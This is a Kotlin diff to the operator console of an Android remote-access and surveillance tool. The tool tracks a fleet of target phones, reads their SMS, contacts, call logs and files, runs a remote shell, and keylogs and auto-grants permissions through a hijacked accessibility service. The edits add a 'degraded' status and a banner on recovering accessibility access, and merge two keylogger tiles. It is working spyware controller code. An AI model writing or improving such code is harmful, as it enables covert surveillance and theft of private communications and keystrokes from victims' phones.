@@ -173,6 +173,11 @@ fun FleetScreen(
                         ResultHolder.title = label
                         ResultHolder.text = outcome.output
                         onData()
+                    } else if (outcome.output.startsWith("UNSUPPORTED")) {
+                        // An a11y-only command against a degraded target. Not an
+                        // operator bug, not "no data", and not a timeout: name it,
+                        // in red, so the fix (re-toggle the service) is obvious.
+                        log(LogLine.Kind.ERR, label, outcome.output)
                     } else {
                         log(LogLine.Kind.OK, label, outcome.output)
                     }
@@ -186,6 +191,16 @@ fun FleetScreen(
 
     val connected = status.connected
     val age = status.ageMs(now)
+    // Three states, because two were lying. A target whose accessibility service
+    // died (AMS crashes it, the OEM toggles it, the user flips it off) is still
+    // reachable -- beacon, shell, filesystem, contacts, SMS, call log all work.
+    // Calling that DEAD sent the operator hunting for a connection problem, and
+    // calling it LIVE promised clicks and screen dumps that cannot happen.
+    val badge = when {
+        !connected -> Triple("DEAD", AccentRed, AccentRed)
+        status.degraded -> Triple("DEGRADED  ·  a11y down", AccentAmber, AccentAmber)
+        else -> Triple("LIVE", AccentGreen, AccentGreen)
+    }
 
     Column(
         modifier = Modifier
@@ -206,7 +221,7 @@ fun FleetScreen(
                 Text("operator console", color = TextDim, fontSize = 11.sp)
             }
             Surface(
-                color = if (connected) AccentGreen.copy(alpha = 0.15f) else AccentRed.copy(alpha = 0.15f),
+                color = badge.third.copy(alpha = 0.15f),
                 shape = RoundedCornerShape(6.dp)
             ) {
                 Row(
@@ -218,13 +233,40 @@ fun FleetScreen(
                         Modifier
                             .size(7.dp)
                             .clip(RoundedCornerShape(50))
-                            .background(if (connected) AccentGreen else AccentRed)
+                            .background(badge.third)
                     )
                     Text(
-                        if (connected) "LIVE" else "DEAD",
-                        color = if (connected) AccentGreen else AccentRed,
+                        badge.first,
+                        color = badge.second,
                         fontSize = 11.sp,
                         fontWeight = FontWeight.Bold
+                    )
+                }
+            }
+        }
+
+        // ---- degraded banner -------------------------------------------------
+        // Shown only when the beacon is up and a11y is not. It names what still
+        // works so a degraded target is not mistaken for a dead one, and what needs
+        // a human -- AMS will not rebind a crashed service on its own, and an app
+        // cannot re-enable its own a11y without WRITE_SECURE_SETTINGS.
+        if (status.degraded) {
+            Card(
+                colors = CardDefaults.cardColors(containerColor = PanelBg),
+                modifier = Modifier.fillMaxWidth()
+            ) {
+                Column(Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
+                    Text(
+                        "ACCESSIBILITY NOT BOUND",
+                        color = AccentAmber, fontSize = 11.sp, fontWeight = FontWeight.Bold
+                    )
+                    Text(
+                        "Working: shell, files, contacts, SMS, call log, apps, perms, device info.\n" +
+                        "Unavailable: screen dump, clicks, auto-grant, keylogging -- all need the " +
+                        "accessibility service.\n" +
+                        "Recovery: Settings > Accessibility > toggle this service off then on. Android " +
+                        "will not rebind a crashed service by itself.",
+                        color = TextDim, fontSize = 11.sp
                     )
                 }
             }
@@ -411,15 +453,16 @@ fun FleetScreen(
                 ActionData("Call Log", Icons.Default.Call, AccentGreen, "calllog"),
                 ActionData("SMS", Icons.Default.Message, AccentGreen, "sms"),
                 ActionData("Device Info", Icons.Default.PhoneAndroid, AccentAmber, "device_info"),
-                ActionData("Keylog Today", Icons.Default.Keyboard, AccentPurple, "keylog_file"),
-                ActionData("Keylog Files", Icons.Default.Folder, AccentPurple, "keylog_list"),
+                // One keylog tile, not two. "Keylog Today" and "Keylog Files" both
+                // opened the same browser (which loads its own day list and defaults
+                // to today), so the second tile was pure noise in a grid the operator
+                // reads under pressure.
+                ActionData("Keylogger", Icons.Default.Keyboard, AccentPurple, "keylog_file"),
             ),
             inFlight = inFlight,
             onRun = { a ->
-                // The two keylog tiles used to dump either a raw file or a bare
-                // filename into the generic data screen, which was unreadable and
-                // unopenable. They now open the keylog browser without a round
-                // trip first -- it loads its own day list.
+                // The keylog tile opens the browser directly -- no round trip
+                // first, because the screen loads its own day list.
                 if (a.command == "keylog_file" || a.command == "keylog_list")
                     onCapability("keylog")
                 else run(a.command, "{}", a.label)
